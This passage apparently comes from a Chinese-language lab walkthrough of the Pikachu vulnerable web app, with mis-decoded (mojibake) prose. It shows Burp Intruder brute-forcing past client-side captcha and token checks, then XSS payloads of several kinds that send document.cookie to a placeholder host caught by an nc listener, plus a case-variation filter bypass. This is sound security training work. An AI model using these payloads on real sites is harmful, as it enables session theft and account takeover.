            code <span class="token operator">+=</span> selectChar<span class="token punctuation">[</span>charIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//alert(code);</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>checkCode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            checkCode<span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">&quot;code&quot;</span><span class="token punctuation">;</span>
            checkCode<span class="token punctuation">.</span>value <span class="token operator">=</span> code<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> inputCode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#bf_client .vcode'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>inputCode<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;è¯·è¾“å…¥éªŒè¯ç ï¼&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>inputCode <span class="token operator">!=</span> code<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;éªŒè¯ç è¾“å…¥é”™è¯¯ï¼&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">createCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ·æ–°éªŒè¯ç </span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token function">createCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><p>æäº¤æ­£ç¡®çš„éªŒè¯ç å‘åˆ°Repeaterï¼Œéšæ„ä¿®æ”¹éªŒè¯ç å­—æ®µï¼ŒResponseä¹Ÿæœªæç¤ºéªŒè¯ç é”™è¯¯ï¼Œè¯´æ˜è¯¥å­—æ®µè™½ç„¶ä¹Ÿæäº¤ï¼Œä½†æ˜¯æœåŠ¡ç«¯æ²¡æœ‰å¯¹å…¶è¿›è¡Œé€»è¾‘å¤„ç†ï¼Œæ¥ç€è¿˜æ˜¯è€ä¸€å¥—Intruder</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu7.png" alt="pikachu7"></p> <p>çˆ†ç ´æˆåŠŸï¼Œè´¦å·ä¸ºï¼šadminï¼Œå¯†ç ä¸ºï¼š123456</p> <h2 id="tokené˜²çˆ†ç ´"><a href="#tokené˜²çˆ†ç ´" class="header-anchor">#</a> tokené˜²çˆ†ç ´</h2> <p>éšä¾¿æäº¤ä¸€æ¬¡ï¼ŒæŠ“åˆ°çš„æ•°æ®åŒ…å†…å‘ç°åŒ…å«tokenå­—æ®µï¼Œå¹¶ä¸”æ¯æ¬¡æäº¤tokenå€¼éƒ½åœ¨å˜åŒ–ï¼Œé‡æ”¾æ¬¡æ•°è¿‡å¤šä¼šæç¤ºé”™è¯¯ï¼Œå¹¶ä¸”è¯¥tokenå°±åœ¨ç½‘é¡µè¡¨å•ä¸­</p> <p>è¿™å°±æ¯”è¾ƒç®€å•äº†ï¼Œè¿˜æ˜¯Intruderï¼Œç»™tokenå­—æ®µä¹Ÿè®¾ä¸ºå˜é‡ï¼Œåœ¨optionä¸­è®¾ç½®æ­£åˆ™æå–å…¶å†…å®¹</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu8.png" alt="pikachu8"></p> <p>å¯¹åº”çš„payloadä¹Ÿè®¾ç½®ä¸ºè¯¥æ­£åˆ™</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu9.png" alt="pikachu9"></p> <p>å¼€å§‹çˆ†ç ´</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu10.png" alt="pikachu10"></p> <p>çˆ†ç ´æˆåŠŸï¼Œè´¦å·ä¸ºï¼šadminï¼Œå¯†ç ä¸ºï¼š123456</p> <h1 id="cross-site-scripting"><a href="#cross-site-scripting" class="header-anchor">#</a> Cross-Site Scripting</h1> <h2 id="åå°„å‹xss-get"><a href="#åå°„å‹xss-get" class="header-anchor">#</a> åå°„å‹XSS(get)</h2> <p><code>&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</code>ç®€å•å¼¹ä¸ªhelloçœ‹ä¸‹</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu11.png" alt="pikachu11"></p> <p>å¯ä»¥çœ‹åˆ°å†…å®¹è¢«æ’å…¥åˆ°é¡µé¢äº†</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu12.png" alt="pikachu12"></p> <p>åˆ é™¤getçš„messageå­—æ®µï¼Œåˆ·æ–°åhelloæ¶ˆå¤±ï¼Œåå°„å‹xss</p> <p>æ¥ä¸‹æ¥æ„é€ çš„XSSçš„payloadå¦‚ä¸‹ï¼š</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&quot;http://ip:port/cookie=&quot;</span><span class="token operator">+</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ç»è¿‡ç¼–ç åçš„é“¾æ¥å¦‚ä¸‹</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://ip/vul/xss/xss_reflected_get.php?message=%3Cscript%3Enew+Image%28%29.src%3D%22http%3A%2F%2Fip%3Aport%2Fcookie%3D%22%2BencodeURI%28document.cookie%29%3B%3C%2Fscript%3E&amp;submit=submit#
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>vpså¼€å¯ç›‘å¬</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">9999</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ¨¡æ‹Ÿè®¿é—®è¯¥é“¾æ¥</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu13.png" alt="pikachu13"></p> <p>è·å–cookieæˆåŠŸ</p> <h2 id="åå°„å‹xss-post"><a href="#åå°„å‹xss-post" class="header-anchor">#</a> åå°„å‹XSS(post)</h2> <p>ä¹Ÿæ˜¯<code>&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</code>ç®€å•å¼¹ä¸ªhelloçœ‹ä¸‹</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu14.png" alt="pikachu14"></p> <p>urlæ— å˜åŒ–ï¼Œpostä¼ å‚ï¼Œç”¨hackbaræ›´æ¸…æ¥šï¼Œåˆ é™¤messageå­—æ®µï¼Œåˆ·æ–°åhelloæ¶ˆå¤±ï¼Œåå°„å‹xss</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu15.png" alt="pikachu15"></p> <p>åå°„postå‹ä¸æ–¹ä¾¿ç›´æ¥æ„é€ é“¾æ¥è¿›è¡Œæ”»å‡»ï¼Œè¿™é‡Œæ‰‹åŠ¨å°†ä¸‹é¢çš„payloadè¾“å…¥è¿›å»</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&quot;http://ip:port/cookie=&quot;</span><span class="token operator">+</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu16.png" alt="pikachu16"></p> <p>è¿˜æ˜¯è·å¾—äº†cookieï¼Œçœ‹ç€æœ‰ç‚¹ä¹±ï¼Œå¯¹åº”urlè§£ä¸€ä¸‹ç å³å¯</p> <h2 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="header-anchor">#</a> å­˜å‚¨å‹XSS</h2> <p>å°±ä¸å¼¹çª—äº†ï¼Œç›´æ¥å¼€å†²</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&quot;http://ip:port/cookie=&quot;</span><span class="token operator">+</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å¾ˆå¿«å•Šï¼Œcookieå°±æ”¶åˆ°äº†</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu17.png" alt="pikachu17"></p> <p>åˆ·æ–°é¡µé¢ï¼Œä¹Ÿè¿˜æ˜¯èƒ½æ”¶åˆ°cookieï¼Œå­˜å‚¨å‹xss</p> <h2 id="domå‹xss"><a href="#domå‹xss" class="header-anchor">#</a> DOMå‹XSS</h2> <p>éšä¾¿è¾“å…¥ä¸ª1</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu18.png" alt="pikachu18"></p> <p>å‡ºç°åœ¨äº†domæ ‘ä¸­ï¼Œdomå‹xssï¼Œå°è¯•æ„é€ æ¶æ„dom</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>' onclick=&quot;new Image().src='http://ip:port/?cookie='+encodeURI(document.cookie);&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ¶æ„domæ‹†å…¥åæ–°domæ ‘å¦‚ä¸‹</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu19.png" alt="pikachu19"></p> <p>ç…§ä¾‹vpså¼€å¯ncç›‘å¬ï¼Œå®¢æˆ·ç«¯ç‚¹å‡»åvpsæ”¶åˆ°cookie</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu20.png" alt="pikachu20"></p> <h2 id="domå‹xss-x"><a href="#domå‹xss-x" class="header-anchor">#</a> DOMå‹XSS-X</h2> <p>éšä¾¿è¾“å…¥ä¸ªflagï¼Œå‡ºç°åœ¨äº†domä¸­ï¼Œå¹¶ä¸”urlå†…å‚æ•°ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ï¼Œç±»å‹getåå°„å‹xss</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu21.png" alt="pikachu21"></p> <p>æ€è·¯ä¸€æ ·è¿˜æ˜¯é—­åˆæ ‡ç­¾ï¼Œæ„é€ æ¶æ„dom</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>' onclick=&quot;new Image().src='http://ip:port/?cookie='.concat(encodeURI(document.cookie));&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>è¿™é‡Œè¿æ¥å­—ç¬¦ä¸²ä¸èƒ½ç”¨<code>+</code>å·äº†ï¼Œ<code>+</code>å·ç»urlç¼–ç åå¤±å»äº†è¿æ¥ç¬¦çš„ä½œç”¨ï¼Œæ‰€ä»¥ç”¨concatå‡½æ•°æ›¿æ¢</p> <p>åŒæ—¶æ­¤ç§æ¶æ„é“¾æ¥ç»urlç¼–ç åå¦‚ä¸‹</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://ip/vul/xss/xss_dom_x.php?text=%27+onclick%3D%22new+Image%28%29.src%3D%27http%3A%2F%2Fip%3Aport%2F%3Fcookie%3D%27.concat%28encodeURI%28document.cookie%29%29%3B%22%3E#
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu22.png" alt="pikachu22"></p> <p>ç‚¹å‡»æ ‡ç­¾ä¸­å†…å®¹ï¼Œvpså³å¯æ”¶åˆ°cookie</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu23.png" alt="pikachu23"></p> <h2 id="xssä¹‹ç›²æ‰“"><a href="#xssä¹‹ç›²æ‰“" class="header-anchor">#</a> XSSä¹‹ç›²æ‰“</h2> <p>ç›´æ¥ä¸¤ä¸ªè¾“å…¥æ¡†éƒ½è¾“å…¥ä¸‹æ”¾payloadï¼Œå¼€å†²</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&quot;http://ip:port/cookie=&quot;</span><span class="token operator">+</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu24.png" alt="pikachu24"></p> <p>æ¨¡æ‹Ÿç™»å½•ç®¡ç†å‘˜åå°æŸ¥çœ‹åï¼Œvpsæ”¶åˆ°ç®¡ç†å‘˜cookie</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu25.png" alt="pikachu25"></p> <h2 id="xssçš„è¿‡æ»¤"><a href="#xssçš„è¿‡æ»¤" class="header-anchor">#</a> XSSçš„è¿‡æ»¤</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu27.png" alt="pikachu27"></p> <p>åé¢è¿˜æ˜¯å¼¹çª—å§ï¼Œç´¯äº†ï¼Œæ‡’å¾—åˆ‡æ¥åˆ‡å»äº†</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>è¾“å…¥åæ²¡ååº”ï¼ŒæŸ¥çœ‹é¡µé¢å‘ç°åªå‰©ä¸€ä¸ª<code>&gt;</code>ï¼Œä¸çŸ¥é“å…·ä½“è¿‡æ»¤äº†å•¥ï¼Œæ— è„‘å…ˆè¯•å¤§å°å†™ç»•è¿‡</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sCriPt</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sCriPt</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu26.png" alt="pikachu26"></p> <p>æˆåŠŸç»•è¿‡ï¼Œæ”¶è·cookieä¸€æš</p> <h2 id="xssä¹‹htmlspecialchars"><a href="#xssä¹‹htmlspecialchars" class="header-anchor">#</a> XSSä¹‹htmlspecialchars</h2> <h3 id="htmlspecialcharså‡½æ•°"><a href="#htmlspecialcharså‡½æ•°" class="header-anchor">#</a> htmlspecialcharså‡½æ•°</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$string</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name">ENT_COMPAT</span> <span class="token operator">|</span> <span class="token class-name">ENT_HTML401</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$encoding</span> <span class="token operator">=</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;default_charset&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">bool</span> <span class="token variable">$double_encode</span> <span class="token operator">=</span> <span class="token constant boolean">true</span>
<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>è¯¥å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“</p> <table><thead><tr><th style="text-align:left;">é¢„å®šä¹‰çš„å­—ç¬¦</th> <th style="text-align:left;">è½¬æ¢å</th></tr></thead> <tbody><tr><td style="text-align:left;"><code>&amp;</code> (&amp; ç¬¦å·)</td> <td style="text-align:left;"><code>&amp;amp;</code></td></tr> <tr><td style="text-align:left;"><code>&quot;</code> (åŒå¼•å·)</td> <td style="text-align:left;"><code>&amp;quot;</code>ï¼Œé™¤éè®¾ç½®äº† <strong><code>ENT_NOQUOTES</code></strong></td></tr> <tr><td style="text-align:left;"><code>'</code> (å•å¼•å·)</td> <td style="text-align:left;">è®¾ç½®äº† <strong><code>ENT_QUOTES</code></strong> åï¼Œ <code>&amp;#039;</code> (å¦‚æœæ˜¯ <strong><code>ENT_HTML401</code></strong>) ï¼Œæˆ–è€… <code>&amp;apos;</code> (å¦‚æœæ˜¯ <strong><code>ENT_XML1</code></strong>ã€ <strong><code>ENT_XHTML</code></strong> æˆ– <strong><code>ENT_HTML5</code></strong>)</td></tr> <tr><td style="text-align:left;"><code>&lt;</code> (å°äº)</td> <td style="text-align:left;"><code>&amp;lt;</code></td></tr> <tr><td style="text-align:left;"><code>&gt;</code> (å¤§äº)</td> <td style="text-align:left;"><code>&amp;gt;</code></td></tr></tbody></table> <p>å‚æ•°ï¼šflag(ä½æ©ç ï¼Œç”±ä»¥ä¸‹æŸä¸ªæˆ–å¤šä¸ªæ ‡è®°ç»„æˆï¼Œè®¾ç½®è½¬ä¹‰å¤„ç†ç»†èŠ‚ã€æ— æ•ˆå•å…ƒåºåˆ—ã€æ–‡æ¡£ç±»å‹ã€‚ é»˜è®¤æ˜¯ <code>ENT_COMPAT | ENT_HTML401</code>)</p> <table><thead><tr><th><strong>å¸¸é‡åç§°</strong></th> <th><strong>æè¿°</strong></th></tr></thead> <tbody><tr><td><strong><code>ENT_COMPAT</code></strong></td> <td>ä¼šè½¬æ¢åŒå¼•å·ï¼Œä¸è½¬æ¢å•å¼•å·ã€‚</td></tr> <tr><td><strong><code>ENT_QUOTES</code></strong></td> <td>æ—¢è½¬æ¢åŒå¼•å·ä¹Ÿè½¬æ¢å•å¼•å·ã€‚</td></tr> <tr><td><strong><code>ENT_NOQUOTES</code></strong></td> <td>å•/åŒå¼•å·éƒ½ä¸è½¬æ¢ã€‚</td></tr> <tr><td><strong><code>ENT_IGNORE</code></strong></td> <td>é™é»˜ä¸¢å¼ƒæ— æ•ˆçš„ä»£ç å•å…ƒåºåˆ—ï¼Œè€Œä¸æ˜¯è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚ ä¸å»ºè®®ä½¿ç”¨æ­¤æ ‡è®°ï¼Œ å› ä¸ºå®ƒ<a href="http://unicode.org/reports/tr36/#Deletion_of_Noncharacters" target="_blank" rel="noopener noreferrer">Â» å¯èƒ½æœ‰å®‰å…¨å½±å“<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>ã€‚</td></tr> <tr><td><strong><code>ENT_SUBSTITUTE</code></strong></td> <td>æ›¿æ¢æ— æ•ˆçš„ä»£ç å•å…ƒåºåˆ—ä¸º Unicode ä»£æ›¿ç¬¦ï¼ˆReplacement Characterï¼‰ï¼Œ U+FFFD (UTF-8) æˆ–è€… <code>&amp;#xFFFD;</code> (å…¶ä»–)ï¼Œè€Œä¸æ˜¯è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚</td></tr> <tr><td><strong><code>ENT_DISALLOWED</code></strong></td> <td>ä¸ºæ–‡æ¡£çš„æ— æ•ˆä»£ç ç‚¹æ›¿æ¢ä¸º Unicode ä»£æ›¿ç¬¦ï¼ˆReplacement Characterï¼‰ï¼š U+FFFD (UTF-8)ï¼Œæˆ– <code>&amp;#xFFFD;</code>ï¼ˆå…¶ä»–ï¼‰ï¼Œè€Œä¸æ˜¯æŠŠå®ƒä»¬ç•™åœ¨åŸå¤„ã€‚ æ¯”å¦‚ä»¥ä¸‹æƒ…å†µä¸‹å°±å¾ˆæœ‰ç”¨ï¼šè¦ä¿è¯ XML æ–‡æ¡£åµŒå…¥é¢å¤–å†…å®¹æ—¶æ ¼å¼åˆæ³•ã€‚</td></tr> <tr><td><strong><code>ENT_HTML401</code></strong></td> <td>ä»¥ HTML 4.01 å¤„ç†ä»£ç ã€‚</td></tr> <tr><td><strong><code>ENT_XML1</code></strong></td> <td>ä»¥ XML 1 å¤„ç†ä»£ç ã€‚</td></tr> <tr><td><strong><code>ENT_XHTML</code></strong></td> <td>ä»¥ XHTML å¤„ç†ä»£ç ã€‚</td></tr> <tr><td><strong><code>ENT_HTML5</code></strong></td> <td>ä»¥ HTML 5 å¤„ç†ä»£ç ã€‚</td></tr></tbody></table> <p>å‰ç½®çŸ¥è¯†ç»“æŸï¼Œç›´æ¥å°†è¿™äº›é¢„å®šä¹‰å­—ç¬¦ä¸€(<code>'&quot;&amp;&gt;&lt;</code>)èµ·è¾“å…¥çœ‹çœ‹ï¼Œç»“æœå¦‚ä¸‹</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_main<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_title<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>äººç”Ÿä¹‹æ‰€æœ‰è‹¦çŸ­,æ˜¯å› ä¸ºä½ çš„xsså­¦ä¹ çš„è¿˜ä¸å¤Ÿå¥½<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>get<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_in<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>message<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>notice<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ä½ çš„è¾“å…¥å·²ç»è¢«è®°å½•:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span> <span class="token attr-name">&amp;quot;&amp;amp;&amp;gt;&amp;lt;'</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>'&quot;<span class="token entity named-entity" title="&amp;">&amp;amp;</span><span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>            
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
